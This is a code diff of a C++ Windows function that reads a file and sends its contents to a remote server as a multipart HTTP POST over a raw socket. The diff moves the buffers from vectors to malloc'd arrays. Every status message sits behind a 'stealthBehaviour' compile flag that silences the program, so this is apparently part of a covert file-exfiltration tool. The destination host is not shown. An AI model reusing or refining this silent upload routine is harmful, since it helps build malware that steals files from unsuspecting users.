@@ -71,19 +71,23 @@ void sendFile(std::string path, std::string fileName){
 	in.seekg(0, std::ios::end);
 	int fileSize = in.tellg();
 	in.seekg(0, std::ios::beg);
-	
-	// Create a vector for the data
-	std::vector<char> data;
-	if (!in.eof() && !in.fail()){
-		in.seekg(0, std::ios_base::end);
-		std::streampos fileSize = in.tellg();
-		data.resize(fileSize);
-		in.seekg(0, std::ios_base::beg);
-		in.read(&data[0], fileSize);
+
+	if (fileSize < 0) {
+#if !stealthBehaviour
+		printf("Error getting filesize of %s\n", path.c_str());
+#endif
+		return;
 	}
+	
+	// Malloc char array for the data
+	char* data = (char*)malloc(fileSize * sizeof(char));
+
+	// Read the file into the char array
+	in.read(data, fileSize);
+
 
 #if !stealthBehaviour
-	printf("Data size: %d\n", data.size());
+	printf("Data size: %d\n", fileSize);
 #endif
 
 	// Assemble a HTTP POST request
@@ -104,22 +108,27 @@ void sendFile(std::string path, std::string fileName){
 	request += "Content-Type: multipart/form-data; boundary=MY_BOUNDARY\r\n\r\n";
 	request += "--MY_BOUNDARY\r\n";
 	request += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n";
-	std::vector<char> requestBinary;
-	for (char c : request) {
-		requestBinary.push_back(c);
+	std::string endRequest = "\r\n--MY_BOUNDARY--\r\n";
+	long unsigned int requestSize = (fileSize * sizeof(char)) +
+									(request.size() * sizeof(char)) +
+									(endRequest.size() * sizeof(char));
+	
+	char* requestBuffer = (char*)malloc(requestSize);
+	
+	for (int i = 0; i < request.size(); i++) {
+		requestBuffer[i] = request[i];
 	}
-	// Add the file data
-	for (char c : data) {
-		requestBinary.push_back(c);
+	for (int i = 0; i < fileSize; i++) {
+		requestBuffer[i + request.size()] = data[i];
 	}
-	// Add the end boundary
-	request = "";
-	request += "\r\n--MY_BOUNDARY--\r\n";
-	for (char c : request) {
-		requestBinary.push_back(c);
+	free(data);
+	for (int i = 0; i < endRequest.size(); i++) {
+		requestBuffer[i + request.size() + fileSize] = endRequest[i];
 	}
+	
 	// Send the HTTP POST request
-	int result = send(s, requestBinary.data(), requestBinary.size(), 0);
+	int result = send(s, requestBuffer, requestSize, 0);
+	free(requestBuffer);
 #if !stealthBehaviour
 	if (result == SOCKET_ERROR) {
 		printf("send failed with error: %d\n", WSAGetLastError());
@@ -137,6 +146,7 @@ void sendFile(std::string path, std::string fileName){
 	closesocket(s);
 	WSACleanup();
 	in.close();
+	
 }
 
 
